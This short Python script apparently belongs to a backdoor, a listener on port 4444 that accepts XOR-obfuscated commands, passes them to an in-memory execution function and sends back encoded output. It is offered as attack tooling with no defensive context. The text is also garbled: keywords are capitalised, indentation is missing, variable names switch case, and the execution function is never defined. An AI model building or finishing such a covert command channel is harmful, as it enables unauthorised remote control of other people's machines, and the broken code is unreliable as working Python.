Import socket

# CONFIGURATION
LISTENER_IP = "0.0.0.0" 
LISTENER_PORT = 4444

# XOR Cipher for decoding commands and encoding responses
XOR_KEY = 0x42

# Function to decode incoming commands and encode outgoing responses
Def xor_cipher(data):
Return bytes([b ^ XOR_KEY for b in data])

# Server function to handle incoming connections and execute commands
Def server():
Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Server.bind((LISTENER_IP, LISTENER_PORT))
Server.listen(1)
Print(f"[*] Listening on {LISTENER_PORT}...")
Conn, addr = server.accept()
Print(f"[*] Connection received from {addr}")
While True:
Cmd = conn.recv(4096)
Cmd = xor_cipher(Cmd).decode()
Output = execute_in_memory(cmd)
OutputEncrypted = xor_cipher(output.encode())
Conn.send(OutputEncrypted)
